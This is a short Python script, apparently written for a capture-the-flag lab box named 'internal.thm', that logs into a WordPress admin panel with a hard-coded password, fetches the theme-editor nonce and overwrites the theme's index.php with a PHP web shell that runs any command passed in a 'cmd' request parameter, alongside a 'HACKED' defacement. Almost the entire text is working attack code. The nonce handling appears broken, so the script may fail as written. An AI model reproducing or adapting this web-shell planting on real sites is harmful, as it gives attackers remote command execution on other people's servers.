import requests
import re

find_nonce = re.compile(r'<input type="hidden" id="nonce" name="nonce" value="([^"]*)" />')
payload = lambda nonce: {"nonce": nonce,
"_wp_http_referer": "/blog/wp-admin/theme-editor.php?file=index.php&theme=twentyseventeen",
"newcontent":
"""
<?php get_header(); ?>
<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
HACKED
<?php
get_footer();""",
"action": "edit-theme-plugin-file",
"file": "index.php",
"theme": "twentyseventeen",
"docs-list": ""}

print("* Logging in")
login = requests.post("http://internal.thm/blog/wp-login.php", {
        "log": "admin",
        "pwd": "my2boys",
        "wp-submit": "Log In",
        "redirect_to": "http://internal.thm/blog/wp-admin/",
        "testcookie": 1
    })

print(login)

print("* Fetching theme-editor nonce")
theme_editor = requests.get("http://internal.thm/blog/wp-admin/theme-editor.php?file=index.php&theme=twentyseventeen", cookies=login.cookies)
nonce = find_nonce.search(theme_editor.text)
print("* Poof")
theme_editor = requests.get("http://internal.thm/blog/wp-admin/admin-ajax.php", payload(nonce),cookies=login.cookies)
